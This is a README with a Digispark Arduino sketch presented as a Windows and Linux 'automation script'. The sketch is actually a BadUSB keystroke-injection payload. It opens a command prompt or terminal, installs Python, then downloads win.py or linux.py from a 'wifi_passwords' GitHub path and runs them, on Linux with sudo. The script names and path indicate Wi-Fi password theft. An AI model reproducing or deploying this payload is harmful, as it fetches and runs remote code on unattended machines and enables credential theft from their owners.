# Automation Script for Windows and Linux

This Arduino sketch automates the download and execution of Python scripts on both Windows and Linux systems using the DigiKeyboard library.

## Code

```cpp
#include <DigiKeyboard.h>

void setup() {
  DigiKeyboard.update();
  delay(500);
  
  pinMode(1, OUTPUT); // LED on Model A
  DigiKeyboard.delay(1000);

  /////////////////////////////////// Windows ///////////////////////////////////
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // Open Run dialog
  DigiKeyboard.delay(1000);
  
  DigiKeyboard.print("cmd"); // Open Command Prompt
  DigiKeyboard.delay(3000);
  
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // Press Enter
  DigiKeyboard.delay(3000);
  
  DigiKeyboard.print("cd C:\\Users\\Public\n"); // Change directory
  
  DigiKeyboard.print("curl -o python-3.12.6-amd64.exe https://www.python.org/ftp/python/3.12.6/python-3.12.6-amd64.exe\n"); // Download Python
  DigiKeyboard.delay(60000); // Wait for download to complete
  
  DigiKeyboard.print("python-3.12.6-amd64.exe\n"); // Run Python installer
  DigiKeyboard.delay(2000);

  // Simulate TAB and SPACE keys for installation
  DigiKeyboard.sendKeyStroke(43);   // TAB
  DigiKeyboard.delay(1000); 
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(44);   // SPACE
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(44);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(43, 2 );   // SHIFT + TAB
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(43, 2 );
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(43, 2 );
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(44);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(43, 2 );
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(44);
  DigiKeyboard.delay(60000);
  DigiKeyboard.sendKeyStroke(43, MOD_ALT_LEFT ); // ALT + TAB
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(44); // SPACE
  DigiKeyboard.delay(1000);

  DigiKeyboard.print("exit\n"); // Exit command prompt
  DigiKeyboard.delay(2000);

  // Open CMD again to download win.py
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  
  DigiKeyboard.print("cmd\n"); // Reopen Command Prompt
  DigiKeyboard.delay(3000);
  
  DigiKeyboard.print("cd C:\\Users\\Public\n");
  
  DigiKeyboard.print("curl -o C:\\Users\\Public\\win.py https://github.com/wifi_passwords/win.py\n"); // Download win.py
  DigiKeyboard.delay(8000);
  
  DigiKeyboard.print("python ./win.py\n"); // Execute win.py
  DigiKeyboard.delay(12000);
  
  DigiKeyboard.print("exit\n"); // Exit command prompt
  DigiKeyboard.delay(2000);
  
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // Confirm exit
  DigiKeyboard.delay(15000);

  /////////////////////////////////// Linux ///////////////////////////////////
  DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT); // Open GUI
  DigiKeyboard.delay(3000);
  
  DigiKeyboard.print("terminal"); // Open terminal
  DigiKeyboard.delay(3000);
  
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  
  DigiKeyboard.print("wget https://github.com/wifi_passwords/linux.py -O /tmp/linux.py\n"); // Download linux.py
  DigiKeyboard.delay(15000);
  
  DigiKeyboard.print("sudo apt install python3 -y\n"); // Install Python
  DigiKeyboard.delay(15000);
  
  DigiKeyboard.print("sudo python3 /tmp/linux.py\n"); // Execute linux.py
  DigiKeyboard.delay(12000);
  
  DigiKeyboard.print("exit\n"); // Exit terminal
  DigiKeyboard.delay(2000);
  
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // Confirm exit
  DigiKeyboard.delay(1000);

  digitalWrite(1, HIGH); // Turn on LED when program finishes
}

void loop() {
  // Do nothing here
}
